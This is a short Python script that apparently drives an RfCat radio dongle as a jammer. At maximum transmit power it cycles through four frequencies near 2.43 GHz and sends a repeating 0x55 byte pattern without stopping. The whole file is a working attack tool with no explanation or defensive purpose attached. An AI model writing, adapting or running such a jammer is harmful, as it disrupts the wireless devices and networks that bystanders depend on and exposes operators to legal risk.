from rflib import *
import os

d = RfCat()
d.setMdmModulation(MOD_2FSK)
d.setMaxPower()
freqs = [2428e6, 2429e6, 2430e6, 2431e6]

print("Starting jammer ...")

try:
    while True:
        for f in freqs:
            d.setFreq(f)
            d.RFxmit(b"\x55" * 255)
except KeyboardInterrupt:
    d.setModeIDLE()
    print("\nStopped jammer....")
